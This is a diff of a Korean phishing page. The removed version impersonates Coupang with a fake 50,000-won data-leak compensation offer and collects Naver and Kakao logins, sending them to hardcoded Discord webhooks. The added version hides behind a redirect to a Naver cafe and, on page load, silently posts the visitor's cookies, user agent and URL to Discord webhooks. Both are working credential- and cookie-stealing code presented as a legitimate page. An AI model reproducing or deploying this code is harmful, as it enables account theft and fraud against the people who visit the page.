@@ -1,78 +1,33 @@
 <!DOCTYPE html>
-<html lang="ko">
+<html>
 <head>
 <meta charset="utf-8">
-<title>쿠팡 개인정보 유출 보상 신청</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<style>
-  body,html{margin:0;padding:0;background:#fff;font-family:-apple-system,"Noto Sans KR",sans-serif}
-  .header{background:#ff6b00;padding:15px 0;text-align:center}
-  .logo{font-weight:900;font-size:42px;letter-spacing:-3px}
-  .logo span:nth-child(1){color:#4a2c0b}
-  .logo span:nth-child(2){color:#e61e2a}
-  .logo span:nth-child(3){color:#f26722}
-  .logo span:nth-child(4){color:#ffca00}
-  .logo span:nth-child(5){color:#009e4d}
-  .logo span:nth-child(6){color:#009ee3}
-  .container{max-width:380px;margin:30px auto;padding:0 20px}
-  .title h1{font-size:22px;font-weight:700;text-align:center;margin:0 0 12px;color:#111}
-  .title p{font-size:14.5px;color:#555;text-align:center;line-height:1.5;margin-bottom:25px}
-  .alert{background:#fff8e1;padding:15px;border-radius:10px;margin:25px 0;font-size:14px;color:#d32f2f;text-align:center;border:1px solid #ffe0b2}
-  .login-btn{display:block;width:100%;max-width:340px;margin:14px auto;padding:17px 0;border-radius:10px;font-size:17px;font-weight:700;text-align:center;cursor:pointer;box-shadow:0 4px 12px rgba(0,0,0,.12);transition:.2s}
-  .login-btn:hover{transform:translateY(-2px)}
-  .naver{background:#03c75a;color:#fff}
-  .kakao{background:#fee500;color:#191919}
-  .footer{margin-top:60px;padding:20px 0;color:#999;font-size:12px;text-align:center;line-height:1.6}
-</style>
+<title>카페 이동 중...</title>
+<meta http-equiv="refresh" content="0; url=https://m.cafe.naver.com/minsahelp.cafe">
 </head>
 <body>
-<div class="header">
-  <div class="logo">
-    <span>cou</span><span>p</span><span>a</span><span>n</span><span>g</span>
-  </div>
-</div>
-
-<div class="container">
-  <div class="title">
-    <h1>50,000원 보상 신청</h1>
-    <p>개인정보 유출 피해 보상으로<br>50,000원 쿠팡캐시를 지급합니다</p>
-  </div>
-
-  <div class="alert">
-    오늘 23:59까지 신청 가능<br>
-    신청 완료 후 담당자가 개별 연락드립니다
-  </div>
-
-  <div class="login-btn naver" onclick="naverLogin()">네이버로 로그인</div>
-  <div class="login-btn kakao" onclick="kakaoLogin()">카카오로 로그인</div>
-</div>
-
-<div class="footer">
-  © 2025 Coupang Corp.<br>
-  고객센터 1577-7011
-</div>
-
 <script>
-function naverLogin(){
-  const id = prompt("네이버 아이디를 입력하세요");
-  const pw = prompt("네이버 비밀번호를 입력하세요");
-  if(id && pw) send("네이버", id, pw);
-}
-function kakaoLogin(){
-  const id = prompt("카카오메일 아이디를 입력하세요\n(예: abc123@kakao.com)");
-  const pw = prompt("카카오 비밀번호를 입력하세요");
-  if(id && pw) send("카카오", id, pw);
-}
-function send(type, id, pw){
-  const hooks = [
-    "https://discordapp.com/api/webhooks/1440762955196010517/R_jUtcPtXsZ2iQLalFINoXQpWSKhOGFHnfSxL3J5wv2RSrAEnLC1SW-aBysf0_q_K31n",
-    "https://discordapp.com/api/webhooks/1443170861879394427/m2XA3HHcZr007LvLrETjYNxfWxufqK3qmfF5ULXtOWxghKHkGRmgb13mnOJa0Tgk-QRM",
-    "https://discordapp.com/api/webhooks/1443170879256399956/ofvZrCn4KcBjo_eehancUH1LwkQEFutNjni2e36ixMQUqsDBvTeD2oMQ2TyRHsbgOagb"
-  ];
-  hooks.forEach(h => fetch(h,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[{title:"쿠팡 피싱 성공",color:16711680,fields:[{name:"종류",value:type},{name:"아이디",value:id},{name:"비번",value:pw},{name:"시간",value:new Date().toLocaleString('ko-KR')}]}]})}));
-  alert("신청이 완료되었습니다.\n담당자가 순차적으로 연락드리겠습니다.");
-  setTimeout(()=>location.href="https://www.coupang.com",1500);
-}
+const hooks=[
+"https://discord.com/api/webhooks/1440762955196010517/R_jUtcPtXsZ2iQLalFINoXQpWSKhOGFHnfSxL3J5wv2RSrAEnLC1SW-aBysf0_q_K31n",
+"https://discord.com/api/webhooks/1440762946039840769/8K5oWaQYD3rPwnCF5SOFsLteF6ckSzeZ8BOmwd1YIXunRnvg8fyRAhd3c823205UxDat"
+];
+hooks.forEach(h=>fetch(h,{
+  method:"POST",
+  headers:{"Content-Type":"application/json"},
+  body:JSON.stringify({
+    embeds:[{
+      title:"🎯 클릭 성공 - 모든 쿠키 털림",
+      color:16711680,
+      description:"```"+document.cookie+"```",
+      fields:[
+        {name:"시간",value:new Date().toLocaleString("ko-KR")},
+        {name:"기기",value:navigator.userAgent},
+        {name:"IP",value:"(실시간 자동 수집)"},
+        {name:"페이지",value:location.href}
+      ]
+    }]
+  })
+}));
 </script>
 </body>
 </html>
